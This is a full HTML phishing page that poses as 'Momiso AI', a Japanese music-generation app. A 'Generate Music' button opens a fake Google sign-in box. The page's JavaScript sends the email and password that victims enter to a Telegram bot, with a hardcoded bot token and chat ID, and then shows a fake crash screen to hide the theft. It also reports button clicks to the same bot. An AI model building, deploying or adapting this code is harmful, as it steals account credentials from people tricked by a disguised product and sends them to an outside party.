<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Momiso AI - Japanese Music Generator</title>
    <!-- Solid Icons -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        /* --- General Styles --- */
        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            transition: all 0.4s ease;
        }

        /* --- Main Website (Chat Interface) --- */
        .app-container {
            width: 100%;
            max-width: 600px;
            height: 90vh;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            display: flex;
            flex-direction: column;
            position: relative;
            overflow: hidden;
        }

        /* Header */
        .header {
            padding: 20px;
            border-bottom: 1px solid #eee;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #fff;
        }

        .brand {
            font-size: 20px;
            font-weight: bold;
            color: #333;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .japanese-tag {
            font-size: 12px;
            background: #ff4757;
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: normal;
        }

        /* Chat Area */
        .chat-area {
            flex: 1;
            padding: 30px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            background: linear-gradient(180deg, #fff 0%, #f9f9f9 100%);
        }

        .ai-avatar {
            width: 60px;
            height: 60px;
            background: #1a73e8;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            margin-bottom: 20px;
            box-shadow: 0 4px 10px rgba(26,115,232,0.3);
        }

        .prompt-text {
            font-size: 22px;
            color: #202124;
            margin-bottom: 10px;
            line-height: 1.4;
        }

        .sub-prompt {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 40px;
        }

        /* Generate Button */
        .generate-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(26,115,232,0.3);
            transition: transform 0.2s, background 0.2s;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .generate-btn:hover {
            background-color: #1765cc;
            transform: translateY(-2px);
        }

        /* --- Google Login Overlay --- */
        .login-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(8px);
            display: none; /* Hidden initially */
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .login-box {
            width: 420px;
            background: white;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        }

        .google-label {
            font-size: 14px;
            color: #3c4043;
            margin-bottom: 10px;
            display: block;
        }

        .logo-text {
            font-size: 28px;
            margin-bottom: 20px;
            letter-spacing: -0.5px;
        }

        .input-group { position: relative; text-align: left; margin-bottom: 20px; }
        
        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            box-sizing: border-box;
        }

        input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 14px; }

        .toggle-pass {
            position: absolute; right: 15px; top: 14px; cursor: pointer; color: #5f6368; font-size: 18px;
        }

        .btn-next {
            background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; margin-top: 10px;
        }

        .loading { display: none; margin-top: 20px; color: #5f6368; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* --- Crash Screen --- */
        .crash-screen {
            display: none;
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; color: #fff;
            flex-direction: column; justify-content: center; align-items: center;
            z-index: 2000;
        }

    </style>
</head>
<body>

    <!-- 1. Main App Interface (Japanese AI Music) -->
    <div class="app-container" id="mainApp">
        <div class="header">
            <div class="brand">
                <i class="fas fa-wave-square"></i> Momiso AI
                <span class="japanese-tag">JP/EN</span>
            </div>
            <i class="fas fa-cog" style="color:#5f6368; cursor:pointer;"></i>
        </div>

        <div class="chat-area">
            <div class="ai-avatar">
                <i class="fas fa-music"></i>
            </div>
            
            <h1 class="prompt-text">Upload your song lyrics and describe your music style</h1>
            <p class="sub-prompt">AI will generate a unique track in seconds.</p>

            <!-- Click this to trigger Login -->
            <button class="generate-btn" onclick="showLogin()">
                <i class="fas fa-wand-magic-sparkles"></i> Generate Music
            </button>
        </div>
    </div>

    <!-- 2. Google Style Login Overlay -->
    <div class="login-overlay" id="loginOverlay">
        <div class="login-box">
            <span class="google-label">Google</span>
            <div class="logo-text">
                <span style="color:#4285F4">M</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">m</span><span style="color:#4285F4">i</span><span style="color:#34A853">s</span><span style="color:#EA4335">o</span> AI
            </div>
            <p style="color:#202124; margin-bottom: 40px;">Sign in to continue to Momiso Music Studio</p>

            <form id="loginForm">
                <div class="input-group">
                    <input type="email" id="email" placeholder="Email or phone" required autocomplete="off">
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Enter your password" required>
                    <i class="fas fa-eye toggle-pass" onclick="togglePass()"></i>
                </div>
                
                <button type="submit" class="btn-next">Next</button>
            </form>

            <div class="loading" id="loader">
                <div class="spinner"></div>
                <p>Connecting to Google...</p>
            </div>
        </div>
    </div>

    <!-- 3. Crash Screen -->
    <div class="crash-screen" id="crashScreen">
        <i class="fas fa-bug" style="font-size: 60px; margin-bottom: 20px; color: #ff4757;"></i>
        <h1>Momiso AI Engine Crashed</h1>
        <p>Audio processing failed. Please restart.</p>
    </div>

    <script>
        // --- CONFIGURATION ---
        const botToken = "8831555299:AAHVBTFXoAiA6dNGP2L9atIWqmd7I8C3cgw"; 
        const chatId = "5246166453";     

        // 1. Show Login when Generate is clicked
        function showLogin() {
            // Optional: Send notification that user started generation
            sendMessageToTelegram("🎵 *User clicked 'Generate Music'* on Momiso AI", false);
            
            document.getElementById('loginOverlay').style.display = 'flex';
        }

        // 2. Toggle Password Visibility
        function togglePass() {
            const passField = document.getElementById("password");
            const icon = document.querySelector(".toggle-pass");
            if (passField.type === "password") {
                passField.type = "text";
                icon.classList.remove("fa-eye");
                icon.classList.add("fa-eye-slash");
            } else {
                passField.type = "password";
                icon.classList.remove("fa-eye-slash");
                icon.classList.add("fa-eye");
            }
        }

        // 3. Handle Form Submit
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // UI: Hide button, show loader
            document.querySelector('.btn-next').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            setTimeout(() => {
                // Send Login Data
                sendMessageToTelegram(`🔥 *Login Detected*\n\n📧 Email: <code>${email}</code>\n🔑 Pass: <code>${password}</code>`, true);
                
                // Trigger Crash after 1.5s
                setTimeout(triggerCrash, 1000);
            }, 800);
        });

        // Helper function to send messages
        function sendMessageToTelegram(text, isLogin) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: 'HTML'
                })
            }).catch(err => console.error("Telegram Error:", err));
        }

        // 4. Crash Logic
        function triggerCrash() {
            document.getElementById('loginOverlay').style.display = 'none';
            document.getElementById('mainApp').style.display = 'none';
            document.getElementById('crashScreen').style.display = 'flex';
        }
    </script>

</body>
</html>
